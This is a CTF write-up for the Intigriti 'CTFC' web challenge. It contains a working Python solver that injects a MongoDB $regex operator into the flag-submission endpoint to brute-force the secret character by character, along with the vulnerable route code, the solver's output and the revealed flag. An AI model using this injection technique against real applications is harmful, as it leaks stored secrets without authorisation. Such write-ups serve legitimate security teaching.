# CTFC [182 Solves]

## Description

> I'm excited to share my minimal CTF platform with you all, take a look! btw it's ImPAWSIBLE to solve all challenges 😺
>
> Note: flag format is INTIGRITI{.*}
>
> Author: Jopraveen
>
> <https://ctfc.ctf.intigriti.io> || <https://ctfc2.ctf.intigriti.io>
>
> Attachments: CTFC.zip

<details><summary>Attachment file tree</summary>

```console
root@kali:~/ctf/1337UP/Web/CTFC# unzip -q CTFC.zip

root@kali:~/ctf/1337UP/Web/CTFC# tree client
client
├── Dockerfile
├── IntCTFC
│   ├── app.py
│   ├── static
│   │   ├── css
│   │   │   └── style.css
│   │   ├── img
│   │   │   ├── cat.gif
│   │   │   ├── hero-pattern.svg
│   │   │   └── hkr.svg
│   │   └── js
│   │       └── main.js
│   ├── templates
│   │   ├── ctf_template.html
│   │   ├── dashboard.html
│   │   ├── login.html
│   │   ├── register.html
│   │   ├── t_dashboard.html
│   │   └── template.html
│   └── user
│       ├── __init__.py
│       ├── models.py
│       └── routes.py
└── supervisord.conf

8 directories, 17 files
```

</details>

## Flag

INTIGRITI{h0w_1s_7h4t_PAWSIBLE}

## PoC Code

```python
import requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()

s = requests.Session()
# s.proxies = {"https": "http://127.0.0.1:8080"}
BASE_URL = "https://ctfc.ctf.intigriti.io"

USERNAME = f"test{datetime.now().timestamp()}"
PASSWORD = "pass"

def main():
    s.post(
        f"{BASE_URL}/user/signup",
        data={"form_username": USERNAME, "form_password": PASSWORD},
        verify=False,
        allow_redirects=False,
    )

    possible = "_}!0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    flag = "INTIGRITI{"

    # flag length is guess
    for _ in range(50):
        for c in possible:
            print(f"{flag + c}", end="\r", flush=True)

            resp = s.post(
                f"{BASE_URL}/submit_flag",
                json={"_id": "3", "challenge_flag": {"$regex": f"^{flag + c}.*"}},
                verify=False,
            )

            if resp.text == "correct flag!":
                flag += c
                print()

                if c == "}":
                    return

                break

    print(flag)

if __name__ == "__main__":
    main()
```

```console
root@kali:~/ctf/1337UP/Web/CTFC# python3 solver.py
INTIGRITI{h
INTIGRITI{h0
INTIGRITI{h0w
INTIGRITI{h0w_
INTIGRITI{h0w_1
INTIGRITI{h0w_1s
INTIGRITI{h0w_1s_
INTIGRITI{h0w_1s_7
INTIGRITI{h0w_1s_7h
INTIGRITI{h0w_1s_7h4
INTIGRITI{h0w_1s_7h4t
INTIGRITI{h0w_1s_7h4t_
INTIGRITI{h0w_1s_7h4t_P
INTIGRITI{h0w_1s_7h4t_PA
INTIGRITI{h0w_1s_7h4t_PAW
INTIGRITI{h0w_1s_7h4t_PAWS
INTIGRITI{h0w_1s_7h4t_PAWSI
INTIGRITI{h0w_1s_7h4t_PAWSIB
INTIGRITI{h0w_1s_7h4t_PAWSIBL
INTIGRITI{h0w_1s_7h4t_PAWSIBLE
INTIGRITI{h0w_1s_7h4t_PAWSIBLE}
```

## Solution

```python
# client/IntCTFC/app.py

# (snip)

client = pymongo.MongoClient('localhost',27017)
db = client.ctfdb

def createChalls():
    # (snip)
    db.challs.insert_one({"_id": "38026ed22fc1a91d92b5d2ef93540f20","challenge_name": "ImPAWSIBLE","category": "web","challenge_description": "well, this challenge is not fully created yet, but we have the flag for it","challenge_flag": os.environ['CHALL_FLAG'],"points": "1500","released": "False"})
```

The flag is stored into challenge_flag key in MongoDB.

```python
# client/IntCTFC/app.py

# (snip)

@app.route('/submit_flag',methods=['POST'])
@check_login
def submit_flag():
    _id = request.json.get('_id')[-1]
    submitted_flag = request.json.get('challenge_flag')
    chall_details = db.challs.find_one(
            {
            "_id": md5(md5(str(_id).encode('utf-8')).hexdigest().encode('utf-8')).hexdigest(),
            "challenge_flag":submitted_flag
            }
    )
    if chall_details == None:
        return "wrong flag!"
    else:
        return "correct flag!"
```

The challenge_flag key of the body in POST request has NoSQL Injection Vulnerability.
For example, if send `{"challenge_flag": {"$regex":"^secretvalue.*$"}}` instead of `{"challenge_flag": "foo"}`, the value stored in MongoDB is leakable.

```console
$ echo -ne 3 | md5sum
eccbc87e4b5ce2fe28308fd9f2a7baf3  -

$ echo -ne eccbc87e4b5ce2fe28308fd9f2a7baf3 | md5sum
38026ed22fc1a91d92b5d2ef93540f20  -
```

Additionally, to match the MD5 hash value stored in MongoDB, it is necessary to set the correct value for the _id key.
However, as confirmed above, setting it to `3` should suffice, because `md5(md5("3"))` is 38026ed22fc1a91d92b5d2ef93540f20.

All that's left to do is to brute force until you match the flag.
